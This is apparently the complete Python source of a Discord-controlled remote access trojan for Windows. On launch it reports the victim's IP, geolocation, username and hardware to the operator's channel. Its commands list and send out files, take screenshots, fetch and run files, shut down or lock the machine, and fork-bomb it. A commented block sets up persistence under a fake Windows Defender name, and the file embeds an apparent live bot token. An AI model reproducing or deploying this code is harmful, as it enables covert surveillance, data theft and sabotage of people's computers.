import discord
import requests
import os
from os import remove
from discord.ext import commands
import webbrowser
import ctypes
import shutil
from sys import argv
import pyautogui
import platform
import time
import wmi
import winshell

client = commands.Bot(command_prefix = "/")

"""
startup = 2

if startup == 1:
    try:
        source = os.getcwd() + "\\main.exe"
        username = os.getlogin()
        destination1 = "C:\\Users\\" + username + "\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\Windowsdefendersupport.exe"
        shutil.copyfile(source, destination1)
    except:
        print("error")
elif startup == 2:
    #source = os.getcwd() + "\\main.exe"
    source = os.getcwd() + "\\normal.py"
    username = os.getlogin()
    #destination1 = "C:\\Users\\" + username + "\\AppData\\Local\\Temp\\Windowsdefendersupport.exe"
    destination1 = "C:\\Users\\" + username + "\\AppData\\Local\\Temp\\Windowsdefendersupport.py"
    shutil.copyfile(source, destination1)
"""

@client.event
async def on_ready():
    channel = client.get_channel(915720579628298323)
    #user = discord.utils.get(channel.server.members, name = 'Sap196', discriminator = 6201)
    embedVar = startmsg()
    await channel.send(embed=embedVar)
    print("connected")

@client.command()
async def username(ctx):
    username = os.getlogin()
    embedVar = msgbox("username", f"{username}")
    await ctx.send(embed=embedVar)

@client.command()
async def cwd(ctx):
    cwd = os.getcwd()
    embedVar = msgbox("cwd", f"{cwd}")
    print(cwd)
    await ctx.send(embed=embedVar)

@client.command()
async def website(ctx, website):
    website = str(website)
    webbrowser.open(website, new=1)
    embedVar = msgbox("website", f"The website {website} has been opened")
    await ctx.send(embed=embedVar)

@client.command()
async def shutdown(ctx, time):
    time = str(time)
    embedVar = msgbox("shutdown", f"The shutdown command is gonna execute in {time} seconds")
    await ctx.send(embed=embedVar)
    os.system("shutdown /s /t " + time)

@client.command()
async def lock(ctx):
    embedVar = msgbox("lock", "Lock command is executed")
    await ctx.send(embed=embedVar)
    os.system("shutdown /l")

@client.command()
async def restart(ctx, time):
    time = str(time)
    embedVar = msgbox("restart", f"The restart command is gonna execute in {time} seconds")
    await ctx.send(embed=embedVar)
    os.system("shutdown /r /t " + time)

@client.command()
async def files(ctx, *, dir):
    output = os.listdir(dir)
    output = str(output)
    embedVar = msgbox("files", output)
    await ctx.send(embed=embedVar)

@client.command()
async def msgbox(ctx, title, *, text):
    embedVar = msgbox("msgbox", "Msgbox command executed")
    await ctx.send(embed=embedVar)
    ctypes.windll.user32.MessageBoxW(0, text, title, 0)

@client.command()
async def uninstall(ctx):
    remove(argv[0])
    embedVar = msgbox("uninstall", "client is uninstalled")
    await ctx.send(embed=embedVar)
    os.abort()

@client.command()
async def restartclient(ctx): #to do
    await ctx.send("not ready yet")

@client.command()
async def upload(ctx, *, location):
    try:
        url = ctx.message.attachments[0].url
        await ctx.send("file detected")
    except IndexError:
        await ctx.send("No attachments detected")
    else:
        if url[0:26] == "https://cdn.discordapp.com":
            r = requests.get(url, stream=True)
            imageName = str(location)
            with open(imageName, "wb") as out_file:
                print("Saving image: " + imageName)
                shutil.copyfileobj(r.raw, out_file)

@client.command()
async def download(ctx, *, location):
    file = discord.File(location)
    await ctx.send(file=file) #to do

@client.command()
async def list(ctx):
    username = os.getlogin()
    embedVar = discord.Embed(description="", color=0x00ff00)
    embedVar.set_author(name="Sap196", url="https://github.com/Sap196", icon_url="https://www.biography.com/.image/ar_1:1%2Cc_fill%2Ccs_srgb%2Cfl_progressive%2Cq_auto:good%2Cw_1200/MTY2NjgyOTkyNTMyNTMwMjMx/gettyimages-2637237.jpg")
    embedVar.add_field(name="Client username:", value=f"{username}", inline=True)
    await ctx.send(embed=embedVar)

@client.command()
async def screenshot(ctx):
    location = os.getcwd() + "screenshot.png"
    image = pyautogui.screenshot(location)
    file = discord.File(location)
    await ctx.send(file=file)
    os.remove(location)

@client.command()
async def mkdir(ctx, *, foldername):
    os.mkdir(foldername)

@client.command()
async def rmdir(ctx, *, foldername):
    os.rmdir(foldername)

@client.command()
async def crash(ctx):
    embedVar = msgbox("crash", "The clients pc will crash")
    await ctx.send(embed=embedVar)
    while True:
        #time.sleep(1)
        os.system("start /B start cmd.exe")

@client.command()
async def taskmanager(ctx):
    await ctx.send("some problems with this but it works...")
    time.sleep(3)
    f = wmi.WMI()
    for process in f.Win32_Process():
        await ctx.send(f"{process.ProcessId:<10} {process.Name}")
    embedVar = msgbox("taskmanager", "All processes have been listed above")

@client.command()
async def runfile(ctx, filename):
    os.startfile(filename)
    embedVar = msgbox("runfile", f"The file {filename} has been run")

#@client.command()
#async def cmdcommand(ctx, *, command):
    #output = str(os.system(command))
    #await ctx.send(output)


def msgbox(command, value):
    embedVar = discord.Embed(description="", color=0x00ff00)
    embedVar.set_author(name="Sap196", url="https://github.com/Sap196", icon_url="https://www.biography.com/.image/ar_1:1%2Cc_fill%2Ccs_srgb%2Cfl_progressive%2Cq_auto:good%2Cw_1200/MTY2NjgyOTkyNTMyNTMwMjMx/gettyimages-2637237.jpg")
    embedVar.add_field(name="Command executed", value=f"The {command} command has been executed", inline=True)
    embedVar.add_field(name="Output:", value=f"{value}", inline=False)
    embedVar.set_footer(text="Made by Sap196, dont be a skid and copy")
    return embedVar

def startmsg():
    requestip = requests.get(f"https://api.ipify.org?format=json").json()
    ip = requestip['ip']
    request = requests.get(f'http://ip-api.com/json/{ip}?fields=status,country,regionName,city,zip,lat,lon,timezone,isp,org,mobile,proxy').json()
    uname = platform.uname()
    username = os.getlogin()
    embedVar = discord.Embed(title=f"Client connected | {ip} | {username}", color=0x00ff00)
    embedVar.set_author(name="Sap196", url="https://github.com/Sap196", icon_url="https://www.biography.com/.image/ar_1:1%2Cc_fill%2Ccs_srgb%2Cfl_progressive%2Cq_auto:good%2Cw_1200/MTY2NjgyOTkyNTMyNTMwMjMx/gettyimages-2637237.jpg")
    embedVar.add_field(name=":vertical_traffic_light:_**network**_", value=f"**Ip:** {ip}\n**Vpn:** {request['proxy']}\n", inline=False)
    embedVar.add_field(name=":map: _**location**_", value=f"**Country:** {request['country']}\n**Timezone:** {request['timezone']}\n**Region:** {request['regionName']}\n", inline=False)
    embedVar.add_field(name=":bulb:_**hardware & software**_", value=f"**Device Name:** {uname.machine}\n**User:** {username}\n**CPU:** {uname.processor}\n", inline=False)
    embedVar.set_footer(text="Made by Sap196, dont be a skid and copy")
    return embedVar

client.run('OTAyMTAyMjgwMjkwMDYyMzQ2.YXZiNw.pRrLVdSU8DndwDHI1vjYA8dlNIs')
